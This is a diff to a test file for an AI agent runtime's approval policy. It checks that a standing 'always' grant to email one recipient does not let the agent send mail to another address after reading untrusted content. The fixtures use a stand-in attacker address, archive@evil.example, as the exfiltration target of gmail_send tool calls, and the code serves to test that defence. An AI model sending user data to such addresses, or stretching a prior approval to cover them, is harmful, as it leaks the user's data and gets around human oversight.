@@ -82,6 +82,11 @@ async def test_no_silent_exfiltration_after_untrusted_read(runtime, call):
 async def test_standing_grant_ignored_for_sends_after_untrusted_read(runtime):
     tool = tools([])[-1]
     ap = runtime.policy.request(tool, {"to": "a@b.c", "subject": "s", "body": "b"}, 1, {})
+    runtime.policy.decide(ap["id"], True, "always")                 # "always" … but only to a@b.c
+    other = ("gmail_send", json.dumps({"to": "archive@evil.example", "subject": "S", "body": "x"}))
+    ran, approvals, _ = await run_steps(runtime, [[other]])
+    assert not ran and approvals                                     # another recipient: asks (P1-1)
+    ap = runtime.policy.request(tool, {"to": "archive@evil.example", "subject": "s", "body": "b"}, 1, {})
     runtime.policy.decide(ap["id"], True, "always")
     send = ("gmail_send", json.dumps({"to": "archive@evil.example", "subject": "Summary", "body": "notes"}))
     ran, approvals, _ = await run_steps(runtime, [[send]])
